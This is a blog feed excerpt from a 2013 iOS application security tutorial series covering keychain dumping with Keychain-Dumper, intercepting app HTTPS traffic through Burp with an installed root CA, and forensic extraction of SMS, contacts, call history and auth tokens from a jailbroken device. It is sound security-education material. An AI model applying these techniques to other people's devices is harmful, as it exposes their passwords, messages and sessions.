&lt;p&gt;To fetch information from the keychain, use this.&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;NSString *accountName = [wrapper objectForKey:(id)kSecAttrAccount];&lt;/code&gt;&lt;/p&gt;

&lt;h2 id=&quot;analyzing-keychain-read-write-using-snoop-it&quot;&gt;Analyzing Keychain read-write using Snoop-it&lt;/h2&gt;

&lt;p&gt;One of the great tools to analyze the data being written to the keychain is Snoop-it. If you haven’t seen it yet, check out &lt;a href=&quot;http://resources.infosecinstitute.com/ios-application-security-part-9-analyzing-security-of-ios-applications-using-snoop-it/&quot;&gt;this&lt;/a&gt; tutorial in the same series on Snoop-it. Now run the project &lt;a href=&quot;http://developer.apple.com/library/ios/#samplecode/GenericKeychain/Introduction/Intro.html&quot;&gt;GenericKeychain&lt;/a&gt; on your jailbroken device and analyze it using Snoop-it. There is already a tutorial for running applications with self-signed certificates in this series which could be found &lt;a href=&quot;http://resources.infosecinstitute.com/ios-application-security-part-7-installing-and-running-custom-applications-on-device-without-a-registered-developer-account/&quot;&gt;here&lt;/a&gt;. This app is just a sample project to demonstrate how to read and write from Keychain using a Obective-C wrapper class KeychainWrapper. Make sure this app is being analyzed using Snoop-it. Now open the app and this is the interface that we see.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios12/q.PNG&quot; alt=&quot;Q&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Now enter some username and password and save it. In this case, lets enter the username as “Test User” and the password as “password”. You will see that Snoop-it detects any change to the keychain and is able to tell us the information stored in the keychain. It also tells us the protection attributes for the saved information.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios12/r.png&quot; alt=&quot;R&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Here is the info that gives away the username and password.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios12/s.png&quot; alt=&quot;S&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Now, enter an account number. Snoop-it is able to detect that as well.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios12/t.png&quot; alt=&quot;T&quot; /&gt;&lt;/p&gt;

&lt;p&gt;As you can clearly note, Snoop-it is able to detect the action on the keychain database file as well, i.e whether it is a read, write or a delete. If you reset the contents of the keychain by tapping on Reset, you will see that it detects that as well.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios12/g.png&quot; alt=&quot;G&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;dumping-keychain-data-using-keychain-dumper&quot;&gt;Dumping Keychain data using Keychain Dumper&lt;/h2&gt;

&lt;p&gt;One of the most popular tools for dumping information from the keychain is Keychain dumper by ptoomey3. The github page for this project can be found at this link https://github.com/ptoomey3/Keychain-Dumper. Just go to this url and download the zip file and unzip it. Inside this folder, the only file that we are interested is the &lt;em&gt;keychain_dumper&lt;/em&gt; binary. The information that is allowed to be accessed by an application in the keychain is specified in its entitlements. This binary is signed with a self signed certificate with &lt;em&gt;wildcard&lt;/em&gt; entitlements and hence it is able to access all the keychain items. There could also have been other ways to make sure all the keychain information is granted, like having the entitlements file contain all the keychain access groups or using a specific keychain access group that provides access to all the keychain data. For e.g a tool &lt;a href=&quot;https://code.google.com/p/iphone-dataprotection/wiki/KeychainViewer&quot;&gt;Keychain-viewer&lt;/a&gt; uses the following entitlments.&lt;/p&gt;

&lt;pre&gt;	&lt;key&gt;com.apple.keystore.access-keychain-keys&lt;/key&gt;
	 &lt;true&gt;&lt;key&gt;com.apple.keystore.device&lt;/key&gt;&lt;/true&gt;&lt;/pre&gt;

&lt;p&gt;Just upload this binary into your device in the /tmp folder and make sure its executable.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios12/x.png&quot; alt=&quot;X&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Now make sure that the keychain database file stored at the location &lt;em&gt;/private/var/Keychains/keychain-2.db&lt;/em&gt; is world readable.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios12/y.png&quot; alt=&quot;Y&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Now run the binary.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios12/3.png&quot; alt=&quot;3&quot; /&gt; &lt;img src=&quot;/images/posts/ios12/3x.png&quot; alt=&quot;3x&quot; /&gt;&lt;/p&gt;

&lt;p&gt;As you can see, it dumps all the keychain information. You can see a lot of usernames and passwords stored here. For e.g, we can see that the Mail app stores the username/password of your account in the keychain. Similarly, it is possible to find passwords of some wireless networks that you have previously connected to and much more information. By default, the command above will only dump out the generic and internet passwords. You can see the usage information by using the “-h” command.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios12/4.png&quot; alt=&quot;4&quot; /&gt;&lt;/p&gt;

&lt;p&gt;You can dump all the information using the “-a” command.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios12/5.png&quot; alt=&quot;5&quot; /&gt;&lt;/p&gt;

&lt;p&gt;One of the things that could make the information in the keychain more secure is using a strong passcode. This is because the passcode is used to encrypt the data in the keychain for specific protection attributes and hence having a strong passcode would enforce better security. iOS by default allows for a 4 digit passcode which could range from 0-9999 and hence could be bruteforced in a few minutes. We will look at bruteforcing passcodes later in this series. But there is also another option to set alphanumeric passwords which would take significantly more time to be bruteforced. A combination of a proper protection attribute combined with a strong passcode will help in keeping the data in the keychain much more difficult to be fetched out.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Conclusion&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;In this article, we looked at how easy it is to dump information from the Keychain of an iOS device. Even though keychain is a much better place of storing credentials and sensitive information than something like NSUserDefaults or plist files, it is however not difficult to break into it either.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;References&lt;/strong&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Keychain-Dumper&lt;br /&gt;
&lt;a href=&quot;https://github.com/ptoomey3/Keychain-Dumper&quot;&gt;https://github.com/ptoomey3/Keychain-Dumper&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
</content>
 </entry>
 
 <entry>
   <title>iOS Application Security Part 11 – Analyzing Network Traffic over HTTP/HTTPS</title>
   <link href="https://bitbrain.github.io/2013/08/20/ios-application-security-part-11-analyzing-network-traffic-over-http-slash-https.html"/>
   <updated>2013-08-20T07:32:00+00:00</updated>
   <id>https://bitbrain.github.io/2013/08/20/ios-application-security-part-11-analyzing-network-traffic-over-http-slash-https</id>
   <content type="html">&lt;p&gt;In the previous article, we looked at iOS filesystem and forensics. In this article, we will be looking at how we can analyze the network traffic flowing across an iOS device. Analyzing the network traffic for an application could be helpful in many ways. It could help us deduce how the application is managing the session of its users, the endpoints to which the application makes the call, how the application works internally etc. We will also look at how we can analyze network traffic over SSL.&lt;/p&gt;

&lt;!-- more --&gt;

&lt;p&gt;There are both active and passive ways of sniffing traffic on a network. In case you are interested in analyzing the traffic for a particular device over a network remotely, wireshark is the tool to go for. Just open up Wireshark, start sniffing over the network and add a filter (for e.g ip.addr == 192.168.1.2) so that it shows only the traffic sent or received from your iOS device. It is possible that you may lose some packets if you don’t have a good wireless card.&lt;/p&gt;

&lt;p&gt;In case you want to analyze the traffic for a device over SSL, there are plenty of ways to do that as well using a combination of Arpspoof and SSLStrip. However, since we are interested in analyzing network traffic for a particular application, we will be following a different approach. So just to clarify, this article is focussed on Analyzing network traffic and not hijacking network traffic. Also, we can analyze the traffic either over Wi-fi or over cellular. Since we are interested in analyzing the traffic for a particular application, it doesn’t really matter which medium we choose.&lt;/p&gt;

&lt;h3 id=&quot;using-tcpdump&quot;&gt;Using TCPDump&lt;/h3&gt;

&lt;p&gt;One of the most basic techniques to capture traffic over your device is by using tcpdump. First of all, make sure that tcpdump is installed on your device.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios11/1.png&quot; alt=&quot;1&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Now, start capturing the data on a particular interface and write the output to a file.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios11/2.png&quot; alt=&quot;2&quot; /&gt;&lt;/p&gt;

&lt;p&gt;To capture this data over cellular, just change the interface to point to the one related to the IP address provided by your cellular connection.&lt;/p&gt;

&lt;p&gt;To analyze this file, you will have to transfer it onto your system and analyze it using Wireshark. However, as you might have already noted, this is a tedious process and there is a much better way to do the entire process using Pipes. More information can be found &lt;a href=&quot;http://wiki.wireshark.org/CaptureSetup/Pipes#Remote_Capture&quot;&gt;here&lt;/a&gt;. In any case, the information from tcpdump gives us too much of low level information, something that we are definitely not interested in as we are interested in analyzing data from an application level. There is a much better alternative to this using Burpsuite and Snoop-it.&lt;/p&gt;

&lt;h2 id=&quot;using-snoop-it&quot;&gt;Using Snoop-it&lt;/h2&gt;

&lt;p&gt;So let’s discuss how to analyze the network traffic through Snoop-it. By the way, if you haven’t seen it yet, check out &lt;a href=&quot;http://resources.infosecinstitute.com/ios-application-security-part-9-analyzing-security-of-ios-applications-using-snoop-it/&quot;&gt;part 9&lt;/a&gt; of this tutorial series on Snoop-it. In order to see the api or network calls being made, just open any app in Snoop-it and go to the Network section on the left. For e.g, the image below shows the network calls being made in the application Snapchat.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios11/3.png&quot; alt=&quot;3&quot; /&gt;&lt;/p&gt;

&lt;p&gt;If we tap on a particular request, we can see the contents of it like the query string, the body etc.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios11/4.png&quot; alt=&quot;4&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;using-burpsuite-over-http&quot;&gt;Using Burpsuite over HTTP&lt;/h2&gt;

&lt;p&gt;Again, there is a much better way of showing these requests/responses and Burpsuite stands out among all these tools. Download Burpsuite from its &lt;a href=&quot;http://portswigger.net/burp/&quot;&gt;official&lt;/a&gt; website. The free edition should be sufficient for the task that we are supposed to perform in this article. Also, if you haven’t used Burpsuite before, check out &lt;a href=&quot;http://resources.infosecinstitute.com/burp-suite-walkthrough/&quot;&gt;this&lt;/a&gt; article that i have written about Burpsuite. The main task here is to use Burpsuite as a proxy and route all our traffic from it.&lt;/p&gt;

&lt;p&gt;Open up Burpsuite, go to &lt;em&gt;Proxy -&amp;gt; Options&lt;/em&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios11/x.png&quot; alt=&quot;X&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Click on the proxy that is set, click on &lt;em&gt;Edit&lt;/em&gt; and select the option &lt;em&gt;All Interfaces&lt;/em&gt; inside the option &lt;em&gt;Bind to Address&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios11/5.png&quot; alt=&quot;5&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Here we can edit the port the proxy is listening on, and even add a new proxy listener. Burp also has option of presenting certificates to SSL protected websites. By default, Burp creates a self-signed CA certificate upon installation. The current checked option (shown below), i.e generate CA-signed per-host certificates will generate a certificate for the particular host we are connecting to signed by the CA certificate that was created on installation of Burp&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios11/y.png&quot; alt=&quot;Y&quot; /&gt;&lt;/p&gt;

&lt;p&gt;You will be prompted with a warning. Click on &lt;em&gt;Yes&lt;/em&gt;. The reason why we selected the option to bind on all interfaces is because we want our iPhone to use our computer as a proxy and hence just selecting the option to bind to the local interface wouldn’t have been enough.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios11/6.png&quot; alt=&quot;6&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Now, go to &lt;em&gt;Proxy -&amp;gt; Intercept&lt;/em&gt; and make sure Intercept is set to off. This is because you may not want to be bothered with forwarding every packet that comes through the proxy.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios11/7.png&quot; alt=&quot;7&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Now, you will have to tell your device to route traffic through this proxy. On your iOS device, go to the Settings App, click on &lt;em&gt;Wifi&lt;/em&gt;, select the network that you are connected to and on its settings, scroll down and there will be an option to set its proxy. Set the proxy as your computers IP address which is currently running Burpsuite and the port as the port on which the proxy is running.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios11/i.png&quot; alt=&quot;I&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Now that the proxy is set up and we have configured our device to use this proxy, go to any application that doesn’t use SSL (we will discuss SSL later in this article) and try to hang around so that some network calls are made. You will see the requests going though in Burpsuite. Here is the traffic going through for the NASA TV App&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios11/8.png&quot; alt=&quot;8&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The good thing about Burpsuite is that we can see the packet in Raw and Hex format and also see the Params and the headers for every request and response.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios11/9.png&quot; alt=&quot;9&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Also, we can see the corresponding response for a particular request.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios11/10.png&quot; alt=&quot;10&quot; /&gt;&lt;/p&gt;

&lt;p&gt;This will help us understand in great detail how an application communicates with the backend, what are the endpoints that get called, and what is the response format.&lt;/p&gt;

&lt;h2 id=&quot;using-burpsuite-over-https&quot;&gt;Using Burpsuite over HTTPS&lt;/h2&gt;

&lt;p&gt;However, the technique mentioned above will not work for applications that use SSL to communicate with the backend. Some applications are coded in such a way that only SSL connections are allowed. For e.g if you try to run the Snapchat app through this proxy, it will fail. However, some applications will issue a warning and ask to confirm or cancel the connection. For e.g, the screenshot shown below shows a warning from Safari when run using the proxy.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios11/IMG_0070.PNG&quot; alt=&quot;IMG 0070&quot; /&gt;&lt;/p&gt;

&lt;p&gt;If you click on Continue, you will be able to see the application traffic. Please note that this warning is accepted only for this host currently. If you browse to another website with HTTPS enabled, you will be shown another warning because Burpsuite generates a fake SSL certificate for every host.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios11/11.png&quot; alt=&quot;11&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Whenever we connect to a HTTPS website via Burpsuite, Burp generates an SSL certificate for each host, which is signed by its own Certificate Authority (CA) certificate. In order to make sure that these warnings don’t come up all the time, we have to validate Burp’s CA certificate as a trusted root on the device. Hence, the steps would be to first get the root certificate, then install it on the device. Once it is on the device and is a trusted root certificate, it can sign all the certificates and all of them will be treated as valid. Please note that the private key for this certifcate is stored in your computer and hence when the traffic passes through the proxy on this computer, Burp can decrypt the data using its private key. The root CA certificate is created once you install Burp on your system.&lt;/p&gt;

&lt;p&gt;To install the root certificate on your system, first configure your browser to use the Burpsuite proxy.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios11/12.png&quot; alt=&quot;12&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Then browse to a website that uses SSL. You will be shown a warning&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios11/13.png&quot; alt=&quot;13&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Now our job is to export the root certificate which is used to sign all these certificates. For the domain gmail.com, it is not possible to export the root CA certifcate because we cannot add an exception to the gmail domain. Every domain can enforce a policy of this kind. However, facebook allows us to add an exception. Go to facebook.com using Firefox. You will get a warning. Tap on &lt;em&gt;I Understand the Risks&lt;/em&gt; and tap on &lt;em&gt;Add an Exception&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios11/14.png&quot; alt=&quot;14&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Then, click on &lt;em&gt;View&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios11/15.png&quot; alt=&quot;15&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Go to the &lt;em&gt;Details&lt;/em&gt; tab and select the topmost certificate in the hierarchy. This is the root CA certificate. Then click on Export and save the file with an extension of &lt;em&gt;.crt&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios11/16.png&quot; alt=&quot;16&quot; /&gt;&lt;/p&gt;

&lt;p&gt;These steps can also be found on Burp’s documentation. Here is a screenshot from &lt;a href=&quot;http://portswigger.net/burp/help/proxy_options_installingCAcert.html#iphone&quot;&gt;this&lt;/a&gt; link.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios11/17.png&quot; alt=&quot;17&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Now, send this file to your device. Using appropriate social engineering skills, an attacker can get this certificate installed on a device as well without the user knowing its actual consequences. Here is the warning that you get when you open up this certificate. Tap on &lt;em&gt;Install&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios11/IMG_0071.PNG&quot; alt=&quot;IMG 0071&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Tap on install again. As you can see, the warning is pretty clear over here.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios11/IMG_0072.PNG&quot; alt=&quot;IMG 0072&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Tap on done once you are finished.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios11/IMG_0073.PNG&quot; alt=&quot;IMG 0073&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Now, since this root certificate is treated as valid, every certificate signed by this root certificate will be treated as valid and applications will allow data to be transferred. So now, the Snapchat application that previously wasn’t allowing us to transfer data with the fake SSL certificate will now allow the data to be transferred successfully. This traffic will be intercepted by Burpsuite. As you can see from the figure below, in the login call, we can see the username and password being sent as well as other api calls made by the application.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios11/18.png&quot; alt=&quot;18&quot; /&gt; &lt;strong&gt;Conclusion&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;In this article, we looked at the different ways in which we can figure out the network traffic flowing across an iOS device . Knowing what endpoints get called, what are the requests and response, what are the headers and params etc will help us a lot in figuring out how the application works internally.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;References&lt;/strong&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Installing Burp’s CA Certificate - IPhone&lt;br /&gt;
&lt;a href=&quot;http://portswigger.net/burp/help/proxy_options_installingCAcert.html#iphone&quot;&gt;http://portswigger.net/burp/help/proxy_options_installingCAcert.html#iphone&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
</content>
 </entry>
 
 <entry>
   <title>iOS Application Security Part 10 – iOS Filesystem and Forensics</title>
   <link href="https://bitbrain.github.io/2013/08/20/ios-application-security-part-10-ios-filesystem-and-forensics.html"/>
   <updated>2013-08-20T07:32:00+00:00</updated>
   <id>https://bitbrain.github.io/2013/08/20/ios-application-security-part-10-ios-filesystem-and-forensics</id>
   <content type="html">&lt;p&gt;In this article, we will be looking at the iOS filesystem, understand how the directories are organized, look at some important files, and look at how we can extract data from database and plist files. We will look at how applications store their data in their specific directories (sandbox) and how we can extract them.&lt;/p&gt;

&lt;!-- more --&gt;

&lt;p&gt;One of the important things to note is that in all the previous articles, we have been logging in to the device as the user &lt;em&gt;root&lt;/em&gt;. There is another kind of user with the username &lt;em&gt;mobile&lt;/em&gt;. A mobile user has less privileges than a root user. All the applications run with the user &lt;em&gt;mobile&lt;/em&gt;, with the exception of Cydia and some other applications which run with root privileges. Some of Apple’s internal daemons or services also run with root privileges. A quick &lt;em&gt;ps aux&lt;/em&gt; will make this very clear. On the extreme left, you will see the USER column. We can see that Cydia runs with root privileges, whereas all other applications run with mobile user, for e.g &lt;em&gt;/Applications/AppStore.app/AppStore&lt;/em&gt; while some of the daemons for e.g &lt;em&gt;/usr/sbin/wifid&lt;/em&gt; run with root privileges. Some other applications that you install via Cydia may also run with root privileges. By default, once you jailbreak the device, the password for both root and mobile user is &lt;em&gt;alpine&lt;/em&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios10/1.png&quot; alt=&quot;1&quot; /&gt;&lt;/p&gt;

&lt;p&gt;It is possible for you to configure an app to run with root privileges. For more details on it, check out &lt;a href=&quot;http://stackoverflow.com/a/8796556/119114&quot;&gt;this&lt;/a&gt; answer on Stack Overflow.&lt;/p&gt;

&lt;p&gt;Let’s ssh into the device. Go to /Applications. You can see some apps in this folder. Most of them are apps that come preinstalled with iOS, and then there are some apps installed via Cydia, for e.g the Terminal app. Please note that all the apps running inside /Applications folder don’t run in a sandboxed environment whereas all the applications in the location /var/mobile/Applications run in a sandboxed environment. We will discuss sandboxing later in this article. However, they still run with the user &lt;em&gt;mobile&lt;/em&gt; by default unless specifically configured to run with the user &lt;em&gt;root&lt;/em&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios10/2.png&quot; alt=&quot;2&quot; /&gt;&lt;/p&gt;

&lt;p&gt;All the apps downloaded from the App Store go inside the &lt;em&gt;/var/mobile/Applications/&lt;/em&gt; directory. It also contains the apps that you installed using installipa or an external source like Cydia. All these apps run in a sandboxed environment.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios10/3.png&quot; alt=&quot;3&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Please note that from iOS 4 or later, every app resides in an environment called Sandbox. The main purpose of this is to ensure that the app is not allowed to access any data outside of its own sandbox. This ensures better security. It is however possible to access certain portions of the user data from within an application using proper permissions. This includes permission to fetch the user’s Contacts, photos etc. However, there has been certain debate about this as well. For e.g from iOS 6, an app can get access to a user’s contacts after taking proper permission from the user. Prior to this, an app could access a user’s contacts without taking any permission from the user and it caused quite a &lt;a href=&quot;http://arstechnica.com/gadgets/2012/02/path-addresses-privacy-controversy-but-social-apps-remain-a-risk-to-users/&quot;&gt;controversy&lt;/a&gt; for the Path app.&lt;/p&gt;

&lt;p&gt;It is also possible to access many other things outside of an app’s sandbox using Entitlements. You can read the complete documentation &lt;a href=&quot;http://developer.apple.com/library/ios/#documentation/Miscellaneous/Reference/EntitlementKeyReference/Chapters/EnablingAppSandbox.html&quot;&gt;here&lt;/a&gt;. For e.g, to access read write permissions to the calendar of a user, the entitlements key &lt;em&gt;com.apple.security.personal-information.calendars&lt;/em&gt; has to be marked as YES in the &lt;em&gt;.entitlements&lt;/em&gt; file.&lt;/p&gt;

&lt;p&gt;Let’s look at the directory structure of a particular application. Let’s go inside the Snapchat app directory. This directory structure is common for all apps.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios10/4.png&quot; alt=&quot;4&quot; /&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;The Snapchat.app (Appname.app) folder contains all the assets (images), plist files and the binary for the app.&lt;/li&gt;
  &lt;li&gt;The Documents folder is to used to store any file. This provides a seperate directory to this application folder that could only be used within the context of this application. Here is a line taken from &lt;a href=&quot;http://developer.apple.com/library/mac/#documentation/FileManagement/Conceptual/FileSystemProgrammingGUide/FileSystemOverview/FileSystemOverview.html#//apple_ref/doc/uid/TP40010672-CH2-SW28&quot;&gt;Apple’s documentation&lt;/a&gt; &lt;em&gt;Put user data in the &lt;application_home&gt;/Documents/. User data is any data that cannot be recreated by your app, such as user documents and other user-generated content.&lt;/application_home&gt;&lt;/em&gt;&lt;/li&gt;
  &lt;li&gt;tmp folder is used for putting temporary user data. The application developer should be responsible for freeing up the memory occupied by the files in this folder.&lt;/li&gt;
  &lt;li&gt;The Library folder can be used to keep files that are not essentially user data files.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;You can find more information here. Here is a screenshot from Apple’s &lt;a href=&quot;http://developer.apple.com/library/mac/#documentation/FileManagement/Conceptual/FileSystemProgrammingGUide/FileSystemOverview/FileSystemOverview.html#//apple_ref/doc/uid/TP40010672-CH2-SW28&quot;&gt;documentation&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios10/5.png&quot; alt=&quot;5&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;gathering-information-from-database-files&quot;&gt;Gathering information from database files.&lt;/h2&gt;

&lt;p&gt;Apple uses sqlite databases to store a lot of its information. These databases usually have the extension &lt;em&gt;.db&lt;/em&gt; or &lt;em&gt;.sqlitedb&lt;/em&gt;. Many features for developers such as Core Data, NSUserDefaults etc operate from these sqlite databases on a low level. These database files can be used to extract a lot of information for a particular application or from the operating system in general. This could include call history, or stored mails from within an application etc. To find all the .db files, use the command &lt;em&gt;find . -name *.db&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios10/6.png&quot; alt=&quot;6&quot; /&gt;&lt;/p&gt;

&lt;p&gt;This gives you a list of all the database files stored within the device. Let’s take a look at some of the important database files.&lt;/p&gt;

&lt;p&gt;I have the gmail app installed on my device. This file looks of interest to me.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios10/7.png&quot; alt=&quot;7&quot; /&gt;&lt;/p&gt;

&lt;p&gt;It looks like this file contains some important information. Let’s analyze this file using the sqlite client. Please note that you will need to install the sqlite client named &lt;em&gt;sqlite3&lt;/em&gt; on your device first. Let’s open this file using the command &lt;em&gt;sqlite3 file_name&lt;/em&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios10/10.png&quot; alt=&quot;10&quot; /&gt;&lt;/p&gt;

&lt;p&gt;You will notice that you get a sqlite interpreter. Let’s turn the headers on so that we can see the headers of all column values. You can then use the command &lt;em&gt;.tables&lt;/em&gt; to have a look at all the tables for this database.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios10/11.png&quot; alt=&quot;11&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Some of the tables that look interesting are &lt;em&gt;cached_contacts&lt;/em&gt;, &lt;em&gt;cached_queries&lt;/em&gt; and &lt;em&gt;cached_messages&lt;/em&gt;. Let’s dump out all the information from the table &lt;em&gt;cached_messages&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios10/12.png&quot; alt=&quot;12&quot; /&gt;&lt;/p&gt;

&lt;p&gt;As we can see, it dumps out all the cached emails.&lt;/p&gt;

&lt;p&gt;Similarly, we can dump out all the SMS database from the device which is found on the location /private/var/mobile/Library/SMS. In this dump, you can see a message with the text &lt;em&gt;Test message for ios security tutorial&lt;/em&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios10/13.png&quot; alt=&quot;13&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Another example could be the contacts database. It could be found at the location &lt;em&gt;/var/mobile/Library/AddressBook&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios10/a.png&quot; alt=&quot;A&quot; /&gt;&lt;/p&gt;

&lt;p&gt;And you can find the call history at the location &lt;em&gt;/private/var/wireless/Library/CallHistory&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios10/b.png&quot; alt=&quot;B&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Sometimes doing all these things through command line might be an overkill and take too much time. A much better way of analysing all this information would have been to export the file that you want to your desktop. For e.g, lets download the Address Book Sqlite database.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios10/21.png&quot; alt=&quot;21&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We can then analyze this database using a GUI Sqlite client. In my case, i am using &lt;em&gt;MesaSQLite&lt;/em&gt;. It’s free and easy to use. In &lt;em&gt;MesaSQLite&lt;/em&gt; go to &lt;em&gt;File&lt;/em&gt;, then Click on &lt;em&gt;Open Database&lt;/em&gt;, select this db file, then inside the &lt;em&gt;Content&lt;/em&gt; tab, select a table and click on &lt;em&gt;Show All&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;. &lt;img src=&quot;/images/posts/ios10/22.png&quot; alt=&quot;22&quot; /&gt;&lt;/p&gt;

&lt;p&gt;As you can see, a lot of information can be gathered from these database files. I recommend that you try to explore more of these database files in the operating system and also the database files inside every app bundle.&lt;/p&gt;

&lt;h2 id=&quot;gathering-information-from-plist-files&quot;&gt;Gathering information from plist files.&lt;/h2&gt;

&lt;p&gt;Plist files are structured text files that are used for storing various settings and configuration for a particular app. Since the information is stored in a structured way in a plist file in key-value pairs, it is very easy to change this information and hence developers sometimes end up storing more information in these files than it should actually be used for.&lt;/p&gt;

&lt;p&gt;Even on a non-jailbroken device, plist files can be extracted by using the tool iExplorer. You can also get a quick look at the plist file using iExplorer. For e.g, below is the information stored in a plist file on the Defcon iOS app.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios10/p.png&quot; alt=&quot;P&quot; /&gt;&lt;/p&gt;

&lt;p&gt;And here is a screenshot from the User.plist file contained in the Snapchat app inside Documents folder. The first highlighted section is actually the authentication token for that particular user and the second highlighted section is the username for that Snapchat user.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios10/33.png&quot; alt=&quot;33&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Plist files may also contain confidential information like usernames or passwords. The important thing to note is that is that anyone can extract a plist file from a device even if its not jailbroken. You can also extract plist files from itunes backup files. Developers over the last few years have stored confidential information in plist files which is not the correct way. A vulnerability was found in the Linkedin iOS app where the developer was storing user authentication information in plist files. You can find more information about it &lt;a href=&quot;http://blog.scoopz.com/2012/04/07/linkedin-ios-app-also-vulnerable-to-plist-identity-theft/&quot;&gt;here&lt;/a&gt;.&lt;/p&gt;

